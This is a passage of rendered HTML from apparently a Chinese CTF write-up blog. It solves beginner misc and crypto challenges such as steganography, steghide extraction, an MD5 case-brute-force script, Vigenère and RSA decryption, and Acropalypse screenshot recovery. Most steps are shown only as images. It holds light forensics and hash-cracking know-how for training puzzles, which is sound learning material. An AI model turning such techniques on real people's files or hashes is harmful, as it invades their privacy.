+    <a href="#week1steganography" class="header-mark"></a>[WEEK1]Steganography</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps35.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps35.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps35.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps35.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps35.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps35.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps36.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps36.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps36.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps36.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps36.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps36.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps37.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps37.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps37.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps37.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps37.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps37.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>将xqwed替换掉base64解出来12ercs&hellip;..909jk的点，得到解压密码，解压密码得到flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps38.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps38.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps38.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps38.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps38.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps38.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1也许需要一些py" class="headerLink">
+    <a href="#week1%e4%b9%9f%e8%ae%b8%e9%9c%80%e8%a6%81%e4%b8%80%e4%ba%9bpy" class="header-mark"></a>[WEEK1]也许需要一些py</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps22.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps22.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps22.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps22.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps22.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps22.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reverse_case</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  \<span class="c1"># 逐个反转字符串中的大小写字母</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span> <span class="o">**</span> <span class="n">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="n">new_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>      <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>        <span class="n">new_str</span> <span class="o">+=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>      <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>        <span class="n">new_str</span> <span class="o">+=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">new_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calculate_md5</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  \<span class="c1"># 计算字符串的md5值</span>
+</span></span><span class="line"><span class="cl">  <span class="n">md5_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="n">md5_hash</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">md5_hash</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">  <span class="n">input_str</span> <span class="o">=</span> <span class="s2">&#34;pNg_and_Md5_SO_GreaT&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">target_md5</span> <span class="o">=</span> <span class="s2">&#34;63e62fbce22f2757f99eb7da179551d2&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">variations</span> <span class="o">=</span> <span class="n">reverse_case</span><span class="p">(</span><span class="n">input_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="k">var</span> <span class="ow">in</span> <span class="n">variations</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="n">md5</span> <span class="o">=</span> <span class="n">calculate_md5</span><span class="p">(</span><span class="k">var</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;{var}, MD5: {md5}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="k">if</span> <span class="n">md5</span> <span class="o">==</span> <span class="n">target_md5</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>      <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;找到匹配的结果: {var}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>      <span class="k">break</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="week1电信诈骗" class="headerLink">
+    <a href="#week1%e7%94%b5%e4%bf%a1%e8%af%88%e9%aa%97" class="header-mark"></a>[WEEK1]电信诈骗</h3><p>关键词，四行七列，vivo50</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps58.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps58.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps58.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps58.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps58.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps58.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week3尓纬玛" class="headerLink">
+    <a href="#week3%e5%b0%93%e7%ba%ac%e7%8e%9b" class="header-mark"></a>[WEEK3]尓纬玛</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps59.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps59.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps59.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps59.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps59.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps59.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>还是有点问题的，，，，把左侧区纠错，得到flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps60.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps60.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps60.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps60.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps60.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps60.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps61.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps61.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps61.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps61.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps61.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps61.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week2哈希猫" class="headerLink">
+    <a href="#week2%e5%93%88%e5%b8%8c%e7%8c%ab" class="header-mark"></a>[WEEK2]哈希猫</h3><p>逐一解密应该能解出来，，，，懒得搓了</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps55.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps55.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps55.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps55.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps55.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps55.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week2表里的码" class="headerLink">
+    <a href="#week2%e8%a1%a8%e9%87%8c%e7%9a%84%e7%a0%81" class="header-mark"></a>[WEEK2]表里的码</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps56.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps56.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps56.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps56.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps56.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps56.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>加粗填充为黑色，不加粗不填充，扫码得到flag</p>
+<h3 id="week2可爱的洛琪希" class="headerLink">
+    <a href="#week2%e5%8f%af%e7%88%b1%e7%9a%84%e6%b4%9b%e7%90%aa%e5%b8%8c" class="header-mark"></a>[WEEK2]可爱的洛琪希</h3><p>首先，zip未加密</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps48.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps48.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps48.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps48.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps48.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps48.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>然后base64解码得到jpg图片，在图片的属性信息里面的到十六进制字符串，解码得到flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps49.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps49.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps49.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps49.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps49.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps49.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps50.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps50.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps50.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps50.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps50.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps50.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>维吉尼亚解密得到flag</p>
+<h3 id="week2图片里的秘密" class="headerLink">
+    <a href="#week2%e5%9b%be%e7%89%87%e9%87%8c%e7%9a%84%e7%a7%98%e5%af%86" class="header-mark"></a>[WEEK2]图片里的秘密</h3><p>Binwalk得到另一张图</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps51.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps51.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps51.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps51.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps51.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps51.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>盲水印提取</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps52.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps52.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps52.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps52.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps52.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps52.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week2喜帖街" class="headerLink">
+    <a href="#week2%e5%96%9c%e5%b8%96%e8%a1%97" class="header-mark"></a>[WEEK2]喜帖街</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps53.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps53.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps53.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps53.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps53.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps53.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>steghide extract -sf music.wav -p LeeTung</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps54.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps54.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps54.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps54.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps54.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps54.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>随后okk解码得到flag</p>
+<h3 id="week2远在天边近在眼前" class="headerLink">
+    <a href="#week2%e8%bf%9c%e5%9c%a8%e5%a4%a9%e8%be%b9%e8%bf%91%e5%9c%a8%e7%9c%bc%e5%89%8d" class="header-mark"></a>[WEEK2]远在天边近在眼前</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps43.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps43.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps43.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps43.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps43.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps43.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>}\4\a\9\2\b\0\a\5\7\c\e\f__\T\H\G\l\R\I\a_\y\5\4\e_\Y\l\l\a\e\r_\s\I_\S\l\h\7{\g\a\l\f</p>
+<p>Windows下显示不全，可以在Linux下查看</p>
+<h3 id="week2奇怪的screenshot" class="headerLink">
+    <a href="#week2%e5%a5%87%e6%80%aa%e7%9a%84screenshot" class="header-mark"></a>[WEEK2]奇怪的screenshot</h3><p>根据文件描述和图片已知部分，可知为win的截图漏洞
+<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool?search=1" target="_blank" rel="noopener noreferrer">https://github.com/frankthetank-music/Acropalypse-Multi-Tool?search=1</a>利用工具修复得到完整图片，提取其中的文字进行百家姓解密得到flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205039575.png" title="image-20231125205039575" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205039575.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205039575.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205039575.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205039575.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205039575.png 2x"
+            sizes="auto"
+            alt="image-20231125205039575">
+    </a></figure></p>
+<p><a href="https://2048t.com/tools/bjx-format" target="_blank" rel="noopener noreferrer">在线百家姓暗号转换 - 2048T在线工具站</a></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205220820.png" title="image-20231125205220820" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205220820.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205220820.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205220820.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205220820.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205220820.png 2x"
+            sizes="auto"
+            alt="image-20231125205220820">
+    </a></figure></p>
+<h2 id="crypto" class="headerLink">
+    <a href="#crypto" class="header-mark"></a>CRYPTO</h2><h3 id="week1really_ez_rsa" class="headerLink">
+    <a href="#week1really_ez_rsa" class="header-mark"></a>[WEEK1]really_ez_rsa</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import gmpy2
+</span></span><span class="line"><span class="cl">from Crypto.Util.number import long_to_bytes
+</span></span><span class="line"><span class="cl">p=217873395548207236847876059475581824463
+</span></span><span class="line"><span class="cl">q=185617189161086060278518214521453878483
+</span></span><span class="line"><span class="cl">c=6170206647205994850964798055359827998224330552323068751708721001188295410644
+</span></span><span class="line"><span class="cl">e=65537
+</span></span><span class="line"><span class="cl">n=p*q
+</span></span><span class="line"><span class="cl">d= gmpy2.invert(e,(p-1)*(q-1))
+</span></span><span class="line"><span class="cl">m = pow(c,d,n)
+</span></span><span class="line"><span class="cl">print(long_to_bytes(m))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="week1凯撒大帝" class="headerLink">
+    <a href="#week1%e5%87%af%e6%92%92%e5%a4%a7%e5%b8%9d" class="header-mark"></a>[WEEK1]凯撒大帝</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps26.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps26.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps26.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps26.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps26.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps26.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1进制" class="headerLink">
+    <a href="#week1%e8%bf%9b%e5%88%b6" class="header-mark"></a>[WEEK1]进制</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps27.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps27.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps27.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps27.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps27.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps27.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1okk" class="headerLink">
+    <a href="#week1okk" class="header-mark"></a>[WEEK1]okk</h3><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener noreferrer">https://www.splitbrain.org/services/ook</a></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps28.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps28.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps28.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps28.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps28.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps28.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1熊斐特" class="headerLink">
+    <a href="#week1%e7%86%8a%e6%96%90%e7%89%b9" class="header-mark"></a>[WEEK1]熊斐特</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps29.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps29.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps29.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps29.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps29.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps29.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1难言的遗憾" class="headerLink">
+    <a href="#week1%e9%9a%be%e8%a8%80%e7%9a%84%e9%81%97%e6%86%be" class="header-mark"></a>[WEEK1]难言的遗憾</h3><p><a href="https://www.qqxiuzi.cn/bianma/dianbao.php" target="_blank" rel="noopener noreferrer">https://www.qqxiuzi.cn/bianma/dianbao.php</a></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps30.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps30.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps30.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps30.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps30.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps30.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1小兔子可爱捏" class="headerLink">
+    <a href="#week1%e5%b0%8f%e5%85%94%e5%ad%90%e5%8f%af%e7%88%b1%e6%8d%8f" class="header-mark"></a>[WEEK1]小兔子可爱捏</h3><p>密码是42</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps31.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps31.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps31.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps31.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps31.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps31.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1crypto_checkin" class="headerLink">
+    <a href="#week1crypto_checkin" class="header-mark"></a>[WEEK1]Crypto_Checkin</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps6.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps6.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps6.jpg"
